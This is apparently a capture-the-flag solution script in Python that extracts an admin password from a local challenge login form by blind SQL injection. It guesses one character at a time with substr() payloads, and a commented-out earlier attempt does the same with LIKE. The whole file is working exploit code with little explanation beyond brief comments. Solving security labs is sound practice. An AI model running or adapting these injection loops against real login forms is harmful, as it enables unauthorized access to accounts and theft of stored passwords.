#working:
import requests

user = "admin"
password_base = "1' or "

OK_response = "<Response [200]>"
host = 'http://challenge.localhost/'

changed = False
count = 1
pw = ''
while not changed:
    changed = True
    for i in range(39,127):
        char = chr(i)
        guess = f"1' or substr(password,{count},1) = '{char}" # works but case insensitive
        query = {'username':user,'password':guess}
        resp = requests.post(host, data=query)
        if str(resp) == OK_response:
            changed = False
            count += 1
            password_base += char
            pw += char
            print("updated password guess: ", pw)
            break

# VERY close first attempt with no help (resulted in all caps, case-insensitive, solution):
"""
import requests

user = "admin"
password_base = "1' or password like '"

OK_response = "<Response [200]>"
host = 'http://challenge.localhost/'

changed = False
count = 1

while not changed:
    changed = True
    for i in range(39,127):
        char = chr(i)
        guess = password_base+char+"%" # works but case insensitive
        query = {'username':user,'password':guess}
        resp = requests.post(host, data=query)
        if str(resp) == OK_response:
            changed = False
            count += 1
            password_base += char
            print("updated password guess: ", password_base[21:])
            break 
"""
